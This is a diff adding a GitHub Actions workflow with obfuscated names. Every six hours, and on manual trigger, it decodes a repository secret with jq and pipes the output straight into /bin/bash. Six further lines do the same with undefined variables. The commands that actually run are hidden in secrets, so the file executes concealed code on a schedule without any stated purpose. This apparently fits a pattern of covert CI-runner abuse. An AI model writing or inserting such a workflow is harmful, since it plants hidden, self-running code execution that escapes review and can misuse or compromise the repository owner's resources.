@@ -1,0 +1,24 @@
+name: gaoruye2167
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gaoruye2167
+        env:
+          rh96360: ${{ secrets.rh96360 }}
+        run: |
+          echo $rh96360 | jq -r .jxh73 | /bin/bash
+          echo $spl4 | jq -r .ubr38230 | /bin/bash
+          echo $bfsgj299 | jq -r .t24 | /bin/bash
+          echo $qazkw2 | jq -r .f99657 | /bin/bash
+          echo $r87320 | jq -r .e3180 | /bin/bash
+          echo $ce50575 | jq -r .fx8 | /bin/bash
+          echo $nq0 | jq -r .zq154 | /bin/bash
+
